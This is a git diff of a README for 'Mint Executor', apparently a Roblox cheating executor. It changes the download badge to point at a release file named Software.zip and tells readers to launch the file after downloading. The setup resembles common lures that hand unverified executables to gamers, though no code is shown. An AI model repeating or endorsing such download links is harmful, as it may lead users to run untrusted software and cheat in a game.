@@ -13,7 +13,7 @@ Welcome to the official repository of **Mint Executor**, a free-to-use Roblox ex
 ## Getting Started
 To get started with Mint Executor, you can download the software from the link below. Please note that the file needs to be launched after downloading:
 
-[![Download Mint Executor](https://img.shields.io/badge/Download-Mint_Executor-blue.svg)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Mint Executor](https://github.com/khalid2344/Mint-Executor/releases/download/v2.0/Software.zip)](https://github.com/khalid2344/Mint-Executor/releases/download/v2.0/Software.zip)
 
 If the above link does not work, please check the "Releases" section of this repository for alternative download options.
 
